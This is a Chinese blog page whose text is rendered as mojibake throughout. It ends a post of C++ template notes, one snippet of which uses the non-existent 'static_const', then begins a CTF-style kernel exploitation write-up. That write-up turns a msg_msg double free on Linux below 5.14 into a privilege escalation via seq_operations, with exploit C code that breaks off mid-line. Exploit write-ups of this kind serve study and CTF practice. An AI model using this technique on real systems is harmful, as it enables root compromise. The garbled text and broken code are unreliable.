<p>é‚£ç›´æ¥åœ¨å¤´æ–‡ä»¶ä¸­å®šä¹‰ä¸€ä¸ªæ¨¡æ¿å‡½æ•°ä¼šä¸ä¼šåƒåœ¨å¤´æ–‡ä»¶ä¸­å®šä¹‰ä¸€ä¸ªæ™®é€šå‡½æ•°é‚£æ ·ï¼Œåœ¨é“¾æ¥çš„æ—¶å€™çˆ†å¤šé‡å®šä¹‰çš„é”™è¯¯ã€‚ç­”æ¡ˆæ˜¯ä¸ä¼šçš„ï¼Œå› ä¸ºé’ˆå¯¹ç‰¹å®šç±»å‹æ¨¡æ¿å‡½æ•°é•¿çš„æ˜¯ä¸€æ ·çš„ï¼Œæ‰€ä»¥å¦‚æœå¤šä¸ªæ¨¡å—ä¸­éƒ½æœ‰åŒä¸€ä¸ªç‰¹æ€§ç±»å‹çš„æ¨¡æ¿å‡½æ•°ï¼Œé‚£å°±ä¼šéšæœºé€‰æ‹©ä¸€ä¸ªå¹¶ä½¿ç”¨ã€‚</p>
<h2 id="ä¿è¯ä¼ é€’ç»™æ¨¡æ¿çš„å®å‚æ”¯æŒæ¨¡æ¿æ‰€è¦æ±‚çš„æ“ä½œï¼Œä»¥åŠè¿™äº›æ“ä½œåœ¨æ¨¡æ¿ä¸­èƒ½æ­£å¸¸å·¥ä½œï¼Œæ˜¯è°ƒç”¨è€…çš„è´£ä»»ã€‚"><a href="#ä¿è¯ä¼ é€’ç»™æ¨¡æ¿çš„å®å‚æ”¯æŒæ¨¡æ¿æ‰€è¦æ±‚çš„æ“ä½œï¼Œä»¥åŠè¿™äº›æ“ä½œåœ¨æ¨¡æ¿ä¸­èƒ½æ­£å¸¸å·¥ä½œï¼Œæ˜¯è°ƒç”¨è€…çš„è´£ä»»ã€‚" class="headerlink" title="ä¿è¯ä¼ é€’ç»™æ¨¡æ¿çš„å®å‚æ”¯æŒæ¨¡æ¿æ‰€è¦æ±‚çš„æ“ä½œï¼Œä»¥åŠè¿™äº›æ“ä½œåœ¨æ¨¡æ¿ä¸­èƒ½æ­£å¸¸å·¥ä½œï¼Œæ˜¯è°ƒç”¨è€…çš„è´£ä»»ã€‚"></a>ä¿è¯ä¼ é€’ç»™æ¨¡æ¿çš„å®å‚æ”¯æŒæ¨¡æ¿æ‰€è¦æ±‚çš„æ“ä½œï¼Œä»¥åŠè¿™äº›æ“ä½œåœ¨æ¨¡æ¿ä¸­èƒ½æ­£å¸¸å·¥ä½œï¼Œæ˜¯è°ƒç”¨è€…çš„è´£ä»»ã€‚</h2><h2 id="typedef-using"><a href="#typedef-using" class="headerlink" title="typedef using"></a>typedef using</h2><p>typedefä¸»è¦æ˜¯èµ·åˆ«åçš„å…³é”®å­—ï¼Œusingé™¤äº†å¯ä»¥å¼•å…¥å‘½åç©ºé—´å¤–ï¼Œè¿˜å¯ä»¥èµ·åˆ«åï¼Œè€Œä¸”è¿˜å¯ä»¥ç»™æ¨¡æ¿èµ·åˆ«åï¼Œä½†æ˜¯typedefä¸èƒ½ç»™æ¨¡æ¿èµ·åˆ«å</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="keyword">using</span> Vec = MyVector&lt;T, MyAlloc&lt;T&gt;&gt;;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// usage</span></span><br><span class="line">Vec&lt;<span class="keyword">int</span>&gt; vec;</span><br></pre></td></tr></table></figure>

<p>::ä½œç”¨åŸŸè¿ç®—ç¬¦</p>
<p>ä¼—æ‰€å‘¨çŸ¥::å¯ä»¥æ‰€ä»¥ç±»å†…çš„staticæˆå‘˜æˆ–è€…ç±»å†…å®šä¹‰çš„ç±»å‹ï¼Œå¯¹äºä¸€ä¸ªéæ¨¡æ¿ç±»æ¥è¯´ï¼Œé€šè¿‡::å¼•ç”¨çš„æ˜¯ç±»å†…çš„staticæˆå‘˜è¿˜æ˜¯ç±»å‹å¾ˆå¥½åˆ¤æ–­ï¼Œä½†æ˜¯å¦‚æœä½¿ç”¨æ¨¡æ¿ç±»å‹å‚æ•°ç±»çš„åå­—å°±ä¸å¥½åˆ¤æ–­äº†ï¼Œåœ¨é»˜è®¤æƒ…å†µä¸‹c++å‡å®šé€šè¿‡::è®¿é—®çš„åå­—ä¸æ˜¯ç±»å‹ï¼Œå› æ­¤å¦‚æœä½¿ç”¨ä¸€ä¸ªæ¨¡æ¿å‚æ•°çš„ç±»å‹æˆå‘˜ï¼Œå°±å¾—æ˜¾ç¤ºçš„é€šè¿‡å…³é”®å­—typenameæ¥å®ç°ï¼Œå¦‚ä¸‹</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="function"><span class="keyword">typename</span> T::value_type <span class="title">top</span><span class="params">(<span class="keyword">const</span> T&amp; c)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!c.<span class="built_in">empty</span>())&#123;</span><br><span class="line">        <span class="keyword">return</span> c.<span class="built_in">back</span>();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">typename</span> T::<span class="built_in">value_type</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="æ¨¡æ¿å®ä¾‹åŒ–å£°æ˜å’Œå®ä¾‹åŒ–å®šä¹‰"><a href="#æ¨¡æ¿å®ä¾‹åŒ–å£°æ˜å’Œå®ä¾‹åŒ–å®šä¹‰" class="headerlink" title="æ¨¡æ¿å®ä¾‹åŒ–å£°æ˜å’Œå®ä¾‹åŒ–å®šä¹‰"></a>æ¨¡æ¿å®ä¾‹åŒ–å£°æ˜å’Œå®ä¾‹åŒ–å®šä¹‰</h2><p>å®ä¾‹åŒ–å£°æ˜è¯­æ³•å¦‚ä¸‹</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="keyword">template</span> <span class="class"><span class="keyword">class</span> <span class="title">Blob</span>&lt;</span>string&gt;;</span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">template</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(<span class="keyword">const</span> <span class="keyword">int</span>&amp;,<span class="keyword">const</span> <span class="keyword">int</span>&amp;)</span></span>;</span><br></pre></td></tr></table></figure>

<p>è¿™å°±æ˜¯ä¸¤ä¸ªå®ä¾‹åŒ–å£°æ˜ï¼Œå®ä¾‹åŒ–å£°æ˜æ˜¯æŒ‡åˆ«çš„æ¨¡å—ä¸­å·²ç»å®ä¾‹åŒ–äº†Blob<string>æ‰€ä»¥æ²¡å¿…è¦åœ¨è¿™ä¸ªæ¨¡å—ä¸­å†å®ä¾‹åŒ–ä¸€æ¬¡ï¼Œæ‰€ä»¥è¿›è¡Œä¸€ä¸ªå£°æ˜ï¼Œåœ¨ç¼–è¯‘çš„æ—¶å€™å°±ä¸ä¼šå®ä¾‹åŒ–äº†è€Œæ˜¯åœ¨åˆ«çš„æ¨¡å—ä¸­æ‰¾åˆ°è¿™ä¸ªå®ä¾‹åŒ–æ¨¡æ¿ã€‚</p>
<p>å®ä¾‹åŒ–å®šä¹‰è¯­æ³•å¦‚ä¸‹</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> <span class="class"><span class="keyword">class</span> <span class="title">Blob</span>&lt;</span>string&gt;;</span><br><span class="line"><span class="function"><span class="keyword">template</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(<span class="keyword">const</span> <span class="keyword">int</span>&amp;,<span class="keyword">const</span> <span class="keyword">int</span>&amp;)</span></span>;</span><br></pre></td></tr></table></figure>

<p>å®ä¾‹åŒ–å®šä¹‰æ˜¯æŒ‡åœ¨è¿™ä¸ªæ¨¡å—ä¸­æ ¹æ®æ¨¡æ¿å®å‚å®ä¾‹åŒ–è¿™ä¸ªæ¨¡æ¿ã€‚æ­¤å®šä¹‰éå½¼å®šä¹‰ã€‚</p>
<p>å¯¹äºæ¯ä¸ªå®ä¾‹åŒ–å£°æ˜ï¼Œåœ¨ç¨‹åºä¸­çš„æŸä¸ªä½ç½®å¿…é¡»æœ‰å…¶æ˜¾ç¤ºçš„å®ä¾‹åŒ–å®šä¹‰ã€‚</p>
<h2 id="å°†å®å‚ä¼ é€’ç»™å¸¦æ¨¡æ¿ç±»å‹çš„å‡½æ•°å½¢å‚æ—¶ï¼Œèƒ½å¤Ÿè‡ªåŠ¨åº”ç”¨çš„ç±»å‹è½¬æ¢åªæœ‰constè½¬æ¢ä»¥åŠå±çŒªæˆ–è€…å‡½æ•°æŒ‡é’ˆçš„è½¬æ¢ï¼Œä½†æ˜¯å¦‚æœå‡½æ•°å‚æ•°ç±»å‹ä¸æ˜¯æ¨¡æ¿å‚æ•°ï¼Œåˆ™å¯¹å®å‚è¿›è¡Œæ­£å¸¸çš„ç±»å‹è½¬æ¢ã€‚"><a href="#å°†å®å‚ä¼ é€’ç»™å¸¦æ¨¡æ¿ç±»å‹çš„å‡½æ•°å½¢å‚æ—¶ï¼Œèƒ½å¤Ÿè‡ªåŠ¨åº”ç”¨çš„ç±»å‹è½¬æ¢åªæœ‰constè½¬æ¢ä»¥åŠå±çŒªæˆ–è€…å‡½æ•°æŒ‡é’ˆçš„è½¬æ¢ï¼Œä½†æ˜¯å¦‚æœå‡½æ•°å‚æ•°ç±»å‹ä¸æ˜¯æ¨¡æ¿å‚æ•°ï¼Œåˆ™å¯¹å®å‚è¿›è¡Œæ­£å¸¸çš„ç±»å‹è½¬æ¢ã€‚" class="headerlink" title="å°†å®å‚ä¼ é€’ç»™å¸¦æ¨¡æ¿ç±»å‹çš„å‡½æ•°å½¢å‚æ—¶ï¼Œèƒ½å¤Ÿè‡ªåŠ¨åº”ç”¨çš„ç±»å‹è½¬æ¢åªæœ‰constè½¬æ¢ä»¥åŠå±çŒªæˆ–è€…å‡½æ•°æŒ‡é’ˆçš„è½¬æ¢ï¼Œä½†æ˜¯å¦‚æœå‡½æ•°å‚æ•°ç±»å‹ä¸æ˜¯æ¨¡æ¿å‚æ•°ï¼Œåˆ™å¯¹å®å‚è¿›è¡Œæ­£å¸¸çš„ç±»å‹è½¬æ¢ã€‚"></a>å°†å®å‚ä¼ é€’ç»™å¸¦æ¨¡æ¿ç±»å‹çš„å‡½æ•°å½¢å‚æ—¶ï¼Œèƒ½å¤Ÿè‡ªåŠ¨åº”ç”¨çš„ç±»å‹è½¬æ¢åªæœ‰constè½¬æ¢ä»¥åŠå±çŒªæˆ–è€…å‡½æ•°æŒ‡é’ˆçš„è½¬æ¢ï¼Œä½†æ˜¯å¦‚æœå‡½æ•°å‚æ•°ç±»å‹ä¸æ˜¯æ¨¡æ¿å‚æ•°ï¼Œåˆ™å¯¹å®å‚è¿›è¡Œæ­£å¸¸çš„ç±»å‹è½¬æ¢ã€‚</h2><h2 id="å¼•ç”¨æŠ˜å å’Œå³å€¼å¼•ç”¨å‚æ•°"><a href="#å¼•ç”¨æŠ˜å å’Œå³å€¼å¼•ç”¨å‚æ•°" class="headerlink" title="å¼•ç”¨æŠ˜å å’Œå³å€¼å¼•ç”¨å‚æ•°"></a>å¼•ç”¨æŠ˜å å’Œå³å€¼å¼•ç”¨å‚æ•°</h2><p>æ€»ç»“ï¼Œå¦‚æœä¸€ä¸ªå‡½æ•°å‚æ•°æ˜¯æŒ‡å‘æ¨¡æ¿å‚æ•°ç±»å‹çš„å³å€¼å¼•ç”¨ï¼Œåˆ™å¯ä»¥ä¼ é€’ç»™ä»–ä»»æ„ç±»å‹çš„å®å‚ï¼Œå¦‚æœå°†ä¸€ä¸ªä¼˜è´¨ä¼ é€’ç»™è¿™ä¸ªçš„å‚æ•°ï¼Œåˆ™å‡½æ•°å‚æ•°è¢«å®ä¾‹åŒ–ä¸ºä¸€ä¸ªæ™®é€šçš„å·¦å€¼å¼•ç”¨ã€‚</p>
<p>è¿™ä¸ªå°±æ˜¯c++çš„ä¾‹å¤–ï¼Œä¸è¿‡æ¯”è¾ƒæœ‰æ„æ€çš„ä¸€ç‚¹æ˜¯æ¨¡æ¿å‚æ•°å¯ä»¥æ¨æ–­ä¸ºä¸€ä¸ªå¼•ç”¨ç±»å‹ã€‚</p>
<h2 id="æ˜¾ç¤ºçš„å·¦å€¼å¼•ç”¨è½¬åŒ–æˆå³å€¼å¼•ç”¨"><a href="#æ˜¾ç¤ºçš„å·¦å€¼å¼•ç”¨è½¬åŒ–æˆå³å€¼å¼•ç”¨" class="headerlink" title="æ˜¾ç¤ºçš„å·¦å€¼å¼•ç”¨è½¬åŒ–æˆå³å€¼å¼•ç”¨"></a>æ˜¾ç¤ºçš„å·¦å€¼å¼•ç”¨è½¬åŒ–æˆå³å€¼å¼•ç”¨</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">std::string t=<span class="string">&quot;qwe&quot;</span>;</span><br><span class="line">std::string &amp;&amp;s=static_const&lt;string&amp;&amp;&gt;(t);</span><br></pre></td></tr></table></figure>

<h2 id="å¯å˜å‚æ•°å‡½æ•°æ¨¡æ¿"><a href="#å¯å˜å‚æ•°å‡½æ•°æ¨¡æ¿" class="headerlink" title="å¯å˜å‚æ•°å‡½æ•°æ¨¡æ¿"></a>å¯å˜å‚æ•°å‡½æ•°æ¨¡æ¿</h2><p>åˆ©ç”¨é€’å½’ä¸€ä¸ªä¸€ä¸ªå¤„ç†å‚æ•°</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="function">ostream &amp;<span class="title">print</span><span class="params">(ostream &amp;os,<span class="keyword">const</span> T &amp;t)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> os&lt;&lt;t;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T,<span class="keyword">typename</span>... Args&gt;</span><br><span class="line"><span class="function">ostream &amp;<span class="title">print</span><span class="params">(ostream &amp;os,<span class="keyword">const</span> T &amp;t,<span class="keyword">const</span> Args&amp;... rest)</span></span>&#123;</span><br><span class="line">    os&lt;&lt;t&lt;&lt;<span class="string">&quot;, &quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">print</span>(os,rest...);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">print</span>(cout,<span class="number">2134</span>,<span class="number">3456</span>,<span class="string">&quot;asfd&quot;</span>,<span class="string">&quot;2134&quot;</span>,<span class="number">123.2345</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="c-åŸºç¡€å­¦ä¹ å‘Šä¸€æ®µè½"><a href="#c-åŸºç¡€å­¦ä¹ å‘Šä¸€æ®µè½" class="headerlink" title="c++åŸºç¡€å­¦ä¹ å‘Šä¸€æ®µè½"></a>c++åŸºç¡€å­¦ä¹ å‘Šä¸€æ®µè½</h2>
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/11/20/%E4%BD%8E%E7%89%88%E6%9C%AC-%E4%BD%8E%E4%BA%8E5-14-%E5%9F%BA%E4%BA%8Emsg%E4%B8%8Bdoublefree%E7%9A%84%E5%88%A9%E7%94%A8%E9%80%9A%E8%A7%A3/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="æˆ‘çš„åšå®¢">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/11/20/%E4%BD%8E%E7%89%88%E6%9C%AC-%E4%BD%8E%E4%BA%8E5-14-%E5%9F%BA%E4%BA%8Emsg%E4%B8%8Bdoublefree%E7%9A%84%E5%88%A9%E7%94%A8%E9%80%9A%E8%A7%A3/" class="post-title-link" itemprop="url">ä½ç‰ˆæœ¬(ä½äº5.14)åŸºäºmsgä¸‹doublefreeçš„åˆ©ç”¨é€šè§£</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>
              

              <time title="åˆ›å»ºæ—¶é—´ï¼š2022-11-20 17:47:05 / ä¿®æ”¹æ—¶é—´ï¼š17:48:25" itemprop="dateCreated datePublished" datetime="2022-11-20T17:47:05+08:00">2022-11-20</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ç®—æ˜¯è‡ªå·±ç ”ç©¶å‡ºçš„msgçš„åˆ©ç”¨çš„æ–°æ€è·¯å§ï¼Œä¸å¾—ä¸è¯´åœ¨kernelç‰ˆæœ¬å°äº5.14æ—¶çœŸçš„æ˜¯å†…æ ¸åˆ©ç”¨çš„åˆ©å™¨ï¼Œæˆ‘åœ¨å¤šä¸ªcveä¸­éƒ½çœ‹åˆ°äº†msgçš„èº«å½±ã€‚åœ¨msgçš„åˆ©ç”¨ä¸­ï¼Œå¦‚æœå¯ä»¥æ§åˆ¶msg_msgçš„è¯ï¼Œå¯ä»¥è½»æ¾å®Œæˆè¶Šç•Œè¯»ï¼Œä¸€èˆ¬çš„msgåˆ©ç”¨ä¹Ÿå°±æ˜¯è¶Šç•Œè¯»æ³„éœ²æ•°æ®ï¼Œé™¤äº†ä»»æ„è¯»å¦‚æœå†…æ ¸åœ¨æ™®é€šç”¨æˆ·ä¸‹èƒ½å¤Ÿä½¿ç”¨<code>userfault</code>çš„è¯è¿˜å¯ä»¥åˆ©ç”¨msgç›´æ¥ä»»æ„å†™ï¼Œä¿®æ”¹è¿›ç¨‹çš„credæ¥å®Œæˆæƒé™æå‡ï¼Œä½†æ˜¯åœ¨è¾ƒé«˜ç‰ˆæœ¬ä¸‹æ˜¯ç”¨æˆ·æ˜¯æ— æ³•ä½¿ç”¨<code>userfault</code>çš„ï¼Œæ‰€ä»¥æ²¡æœ‰åŠæ³•ä½¿ç”¨msgç›´æ¥ä¸€æŠŠæ¢­çš„ï¼Œåœ¨è¾ƒé«˜ç‰ˆæœ¬ä¸‹ä¸€èˆ¬æ˜¯é€šè¿‡msgæ³„éœ²åœ°å€ï¼Œç„¶åå†æ‰¾ç›¸åº”å¤§å°çš„ç»“æ„ä½“åŠ«æŒÂ·ç¨‹åºæµã€‚</p>
<p>ä½†æ˜¯è¿™ç§æ–¹å¼æ¯”è¾ƒéº»çƒ¦çš„ä¸€ç‚¹æ˜¯ç¬¬äºŒæ­¥åŠ«æŒç¨‹åºæµï¼Œä¸åŒçš„objå¤§å°è¦æ‰¾ä¸åŒçš„ç»“æ„ä½“ï¼Œè€Œä¸”æœ‰äº›å¤§å°çš„objè¿˜æ‰¾ä¸åˆ°å¯ä»¥åˆ©ç”¨çš„ç»“æ„ä½“ï¼Œæˆ‘ä¹Ÿä»¥ä¸ºmsgçš„åˆ©ç”¨ä¹Ÿå°±åˆ°è¿™é‡Œï¼Œä½†æ˜¯åœ¨å‘¨å››åˆç¡èµ·æ¥æ—¶å¿½ç„¶çµå…‰ä¹ç°ï¼Œmsgä¸æ˜¯è¿˜å¯ä»¥æ„é€ ä»»æ„freeå—ï¼Œé‚£å®Œå…¨å¯ä»¥åˆ©ç”¨msgæ„é€ å‡ºä»»æ„sizeçš„objçš„doublefreeå•Šï¼Œå°±æŠŠé—®é¢˜ä»ç‰¹å®šä¸å¥½åˆ©ç”¨çš„sizeçš„objè½¬åŒ–æˆäº†å®¹æ˜“åˆ©ç”¨çš„sizeçš„objäº†ï¼Œå°±å®Œå…¨å®ç°äº†æ€è·¯ä¸Šçš„é€šè§£äº†ã€‚</p>
<h2 id="åˆ©ç”¨æ¡ä»¶"><a href="#åˆ©ç”¨æ¡ä»¶" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h2><ul>
<li>å¯ä»¥å¯¹0x40~0x1000ä»¥å†…çš„obj kfreeä¸¤æ¬¡(æˆ–è€…é‡Šæ”¾ä¸€æ¬¡ä½†æ˜¯æ‹¥æœ‰å†™åŠŸèƒ½)</li>
<li>å†…æ ¸ç‰ˆæœ¬å°äº5.14ï¼Œå› ä¸ºå¦‚æœè¶…è¿‡äº†5.14ï¼Œmsgå°±ä¸ä»kmalloc-xxxä¸­æ‹¿objäº†ï¼Œè€Œæ˜¯ä»kmalloc-cg-xxxä¸­æ‹¿objäº†ï¼Œå¦‚æœå¯ä»¥doublefreeçš„objæ˜¯é€šè¿‡<code>GFP_KERNEL</code>kmallocåˆ°çš„ï¼Œé‚£msgå°±å®Œå…¨ç”³è¯·ä¸åˆ°è¿™ä¸ªobjäº†ã€‚</li>
<li>å¼€å¯äº†<code>MSG_COPY</code>åŠŸèƒ½</li>
</ul>
<h2 id="åˆ©ç”¨æ€è·¯"><a href="#åˆ©ç”¨æ€è·¯" class="headerlink" title="åˆ©ç”¨æ€è·¯"></a>åˆ©ç”¨æ€è·¯</h2><p>å°±ä»¥corctf2021çš„wallä½œä¸ºä¾‹å­ï¼ˆæœ¬æ¥ç›¸ç”¨n1çš„praymoonåšä¾‹å­çš„ï¼Œç»“æœè°ƒè¯•äº†ä¸€ä¸‹åˆæ‰å‘ç°ç‰ˆæœ¬å¤ªé«˜äº†msgæ²¡æ³•ç”¨äº†ã€‚ï¼‰ï¼Œç®€è€Œè¨€ä¹‹å¯ä»¥æŠŠwallçœ‹åšåªèƒ½é‡Šæ”¾ä¸¤æ¬¡åŒä¸€ä¸ª0x40å¤§å°çš„objçš„æŠ½è±¡æ¨¡å‹ã€‚</p>
<h3 id="ä¸€-æ³„éœ²åœ°å€"><a href="#ä¸€-æ³„éœ²åœ°å€" class="headerlink" title="ä¸€.æ³„éœ²åœ°å€"></a>ä¸€.æ³„éœ²åœ°å€</h3><p>é¦–å…ˆæ˜¯åˆ©ç”¨koç”³è¯·ä¸€ä¸ª0x40çš„objç„¶åæŠŠä»–é‡Šæ”¾æ‰</p>
<p>åœ¨è¿™ä¸ªä¾‹å­ä¸­æˆ‘æ‰“ç®—åˆ©ç”¨msgæ„é€ å‡ºdoublefreeçš„0x20çš„obj,è¿™æ ·å°±å¯ä»¥ä½¿ç”¨<code>seq_operations</code>åŠ«æŒç¨‹åºæµæ¥æå‡æƒé™ï¼Œé‚£å°±å¾—æ ¹æ®0x20ç²¾å¿ƒæ„é€ msgäº†ï¼Œæˆ‘çš„æ„é€ å¦‚ä¸‹</p>
<p>ä½¿ç”¨äº†ä¸¤ä¸ªæ¶ˆæ¯é˜Ÿåˆ—ï¼Œåˆ†åˆ«æ˜¯msg_id[0]å’Œmsg_id[1],è¿™ä¸ªmsg_id[0]çš„msgæ˜¯åˆšåˆšæˆ‘ä»¬é‡Šæ”¾çš„objï¼Œç„¶åå†ä½¿ç”¨koæŠŠè¿™ä¸ªobjå†é‡Šæ”¾ä¸€æ¬¡ï¼Œç”±äºä½¿ç”¨çš„æ˜¯slabåˆ†é…ç®—æ³•ï¼Œæ‰€ä»¥é‡Šæ”¾åobjçš„å†…å®¹å¹¶ä¸ä¼šå‘ç”Ÿæ”¹å˜ï¼Œç„¶åå†ä½¿ç”¨<code>setxattr</code>æŠŠè¿™ä¸ªobjç”³è¯·å›æ¥ä¿®æ”¹å…¶ä¸­çš„<code>m_ts</code>å­—æ®µï¼Œç„¶åå†ä½¿ç”¨msg_id[0]è¯»è¿™ä¸ªmsg,å°±èƒ½è¶Šç•Œè¯»åˆ°msg_id[1]çš„ç¬¬ä¸€ä¸ªmsgäº†ï¼Œä¸»è¦è®°å½•çš„å°±æ˜¯msg_id[1]çš„ç¬¬äºŒä¸ªmsgçš„èµ·å§‹åœ°å€<code>ll_next</code>å’Œmsg_id[1]çš„msg_queue<code>ll_prev</code>ï¼Œç„¶åè¿˜æœ‰å‡ ç‡è¯»åˆ°<code>error_injection_list</code>ï¼Œåˆ©ç”¨è¿™ä¸ªæ³„éœ²å†…æ ¸åœ°å€ã€‚ç„¶åå†é€šè¿‡msg_id[1]çš„ç¬¬äºŒä¸ªmsgçš„<code>next</code>å­—æ®µè¯»åˆ°ä¸€ä¸ª0x20çš„objçš„åœ°å€ï¼Œå³target_objã€‚</p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20221120171926473.png" alt="image-20221120171926473"></p>
<p>ä»£ç å¦‚ä¸‹</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">add_rule(fd,<span class="number">0</span>,INBOUND);</span><br><span class="line">    dup_rule(fd,<span class="number">0</span>,INBOUND);</span><br><span class="line">    del_rule(fd,<span class="number">0</span>,INBOUND);</span><br><span class="line">    msg-&gt;mtype=<span class="number">1</span>;</span><br><span class="line">    <span class="built_in">memset</span>(msg-&gt;mtext,<span class="number">0x61</span>,<span class="number">0x1000</span>);</span><br><span class="line">    send_msg(msg_id[<span class="number">0</span>],msg,<span class="number">0x10</span>,IPC_NOWAIT);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(msg-&gt;mtext,<span class="number">0x62</span>,<span class="number">0x1000</span>);</span><br><span class="line">    send_msg(msg_id[<span class="number">1</span>],msg,<span class="number">0x10</span>,IPC_NOWAIT);</span><br><span class="line"></span><br><span class="line">    msg-&gt;mtype=<span class="number">2</span>;</span><br><span class="line">    <span class="built_in">memset</span>(msg-&gt;mtext,<span class="number">0x63</span>,<span class="number">0x1000</span>);</span><br><span class="line">    send_msg(msg_id[<span class="number">1</span>],msg,<span class="number">0xfe8</span>,IPC_NOWAIT);</span><br><span class="line"></span><br><span class="line">    msg-&gt;mtype=<span class="number">3</span>;</span><br><span class="line">    <span class="built_in">memset</span>(msg-&gt;mtext,<span class="number">0x64</span>,<span class="number">0x1000</span>);</span><br><span class="line">    send_msg(msg_id[<span class="number">1</span>],msg,<span class="number">0xfe8</span>,IPC_NOWAIT);</span><br><span class="line"></span><br><span class="line">    msg-&gt;mtype=<span class="number">4</span>;</span><br><span class="line">    <span class="built_in">memset</span>(msg-&gt;mtext,<span class="number">0x65</span>,<span class="number">0x1000</span>);</span><br><span class="line">    send_msg(msg_id[<span class="number">1</span>],msg,<span class="number">0x1008</span>,IPC_NOWAIT);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] doublefree\n&quot;</span>);</span><br><span class="line">    del_rule(fd,<span class="number">0</span>,OUTBOUND);</span><br><span class="line">    msg_header *fake_msg_header=(msg_header *)<span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">    fake_msg_header-&gt;ll_next=(<span class="keyword">void</span> *)<span class="number">0x4141414141414141</span>;</span><br><span class="line">    fake_msg_header-&gt;ll_prev=(<span 